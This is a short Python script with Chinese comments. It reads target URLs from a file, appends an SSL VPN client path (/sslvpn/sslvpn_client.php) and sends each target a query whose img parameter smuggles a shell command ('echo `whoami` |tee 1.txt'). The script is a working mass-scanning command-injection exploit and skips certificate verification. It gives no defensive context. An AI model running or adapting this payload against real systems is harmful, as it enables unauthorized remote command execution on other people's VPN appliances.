import urllib.request
import ssl
from urllib.parse import urlparse, quote

user_agent = "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
headers = {"User-Agent": user_agent}
context = ssl._create_unverified_context()

# 从txt文件中读取url列表
with open("1.txt", "r") as file:
    urls = file.readlines()

# 使用for循环遍历url列表
for url in urls:
    url = url.strip()  # 去除每行url中的换行符和空白字符
    parsed_url = list(urlparse(url))  # 将元组对象转换成列表
    if not parsed_url[0]:  # 如果协议部分为空字符串，则手动添加默认协议
        parsed_url[0] = "http"
    parsed_url[2] += "/sslvpn/sslvpn_client.php"  # 将字符串添加到path属性上
    parsed_url[4] = "client=logoImg&img=x /tmp|echo `whoami` |tee 1.txt"  # 修改查询参数部分的值
    encoded_path = quote(parsed_url[2])  # 对路径部分进行编码
    encoded_query = quote(parsed_url[4])  # 对查询参数部分进行编码
    final_url = f"{parsed_url[0]}://{parsed_url[1]}{encoded_path}?{encoded_query}"  # 拼接编码后的URL
    req = urllib.request.Request(final_url, headers=headers)
    try:
        urllib.request.urlopen(req, context=context)
        print("成功访问：" + final_url)
    except Exception as e:
        print(e)
